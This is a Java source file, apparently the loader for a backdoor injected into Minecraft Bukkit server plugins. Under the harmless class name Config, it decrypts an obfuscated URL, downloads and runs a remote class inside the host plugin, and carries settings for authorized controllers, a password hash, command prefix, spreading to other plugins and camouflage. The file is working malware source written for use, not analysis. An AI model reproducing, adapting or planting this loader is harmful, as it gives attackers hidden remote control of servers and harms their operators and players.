package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;

public final class Config {

    public static String KEY = "::KEY::";
    public static String S_URL_PROVIDER = "::S_URL_PROVIDER::";
    public static String S_MAIN_CLASS = "::S_MAIN_CLASS::";
    
    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;
    
    static {
        getInjectedConfig();
    }

    public Config(Plugin plugin) {
        try {
            executeStateMachine(plugin);
        } catch (Throwable e) {
            plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
            e.printStackTrace();
        }
    }

    private void executeStateMachine(Plugin plugin) throws Throwable {
        int state = 0;
        String urlProvider = null;
        String payloadUrlStr = null;
        URLClassLoader classLoader = null;
        Class<?> loadedClass = null;

        for (;;) {
            switch (state) {
                case 0: {
                    plugin.getLogger().info("[DEBUG] Initializing remote module...");
                    urlProvider = HiddenUtils.decrypt(S_URL_PROVIDER);
                    plugin.getLogger().info("[DEBUG] Fetching resource from: " + urlProvider);
                    state = 1;
                    break;
                }
                case 1: {
                    HttpURLConnection connection = (HttpURLConnection) new URL(urlProvider).openConnection();
                    connection.setRequestMethod("GET");
                    try (InputStream inputStream = connection.getInputStream()) {
                        payloadUrlStr = new BufferedReader(new InputStreamReader(inputStream)).readLine();
                    } finally {
                        connection.disconnect();
                    }
                    state = 2;
                    break;
                }
                case 2: {
                    if (payloadUrlStr == null || payloadUrlStr.isEmpty()) {
                        plugin.getLogger().severe("[DEBUG] Failed to fetch resource URL. Aborting.");
                        return;
                    }
                    plugin.getLogger().info("[DEBUG] Fetched resource URL: " + payloadUrlStr);
                    URL[] urls = { new URL(payloadUrlStr) };
                    classLoader = new URLClassLoader(urls, plugin.getClass().getClassLoader());
                    state = 3;
                    break;
                }
                case 3: {
                    String mainClassName = HiddenUtils.decrypt(S_MAIN_CLASS);
                    loadedClass = classLoader.loadClass(mainClassName);
                    state = 4;
                    break;
                }
                case 4: {
                    loadedClass.getConstructor(Plugin.class, Config.class).newInstance(plugin, this);
                    plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");
                    return;
                }
                default:
                    throw new IllegalStateException("Invalid state in loader");
            }
        }
    }

    private static void getInjectedConfig() {
        String injected_authorized_uuids = "";
        String injected_authorized_usernames = "Kudo,Vdung";
        String injected_command_prefix = "!";
        boolean injected_spread_to_other = Boolean.parseBoolean("true");
        boolean injected_debug_log = Boolean.parseBoolean("true");
        String injected_discord_token = "";
        String injected_authorized_password = "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5";
        boolean injected_camouflage = Boolean.parseBoolean("true");
        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = injected_spread_to_other;
        debug_log = injected_debug_log;
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = injected_camouflage;
    }

    public static final class HiddenUtils {
        public static String decrypt(String encryptedString) {
            try {
                byte[] decoded = customBase64Decode(encryptedString);
                byte[] keyBytes = Config.KEY.getBytes("UTF-8");
                for (int i = 0; i < decoded.length; i++) {
                    decoded[i] = (byte) (decoded[i] ^ keyBytes[i % keyBytes.length]);
                }
                return new String(decoded, "UTF-8");
            } catch (Exception ex) {
                return "decoding.error";
            }
        }

        private static final int[] FROM_BASE64 = new int[256];
        static {
            Arrays.fill(FROM_BASE64, -1);
            String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            for (int i = 0; i < chars.length(); i++) {
                FROM_BASE64[chars.charAt(i)] = i;
            }
            FROM_BASE64['='] = -2;
        }

        private static byte[] customBase64Decode(String src) {
            src = src.replaceAll("\\s", "");
            int len = src.length();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(len * 3 / 4);
            int[] buffer = new int[4];
            int bufferCounter = 0;
            for (int i = 0; i < len; i++) {
                int val = FROM_BASE64[src.charAt(i) & 0xFF];
                if (val >= 0) {
                    buffer[bufferCounter++] = val;
                    if (bufferCounter == 4) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                        baos.write((buffer[2] << 6) | buffer[3]);
                        bufferCounter = 0;
                    }
                } else if (val == -2) {
                    if (bufferCounter == 2) baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                    else if (bufferCounter == 3) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                    }
                    break;
                }
            }
            return baos.toByteArray();
        }
    }
}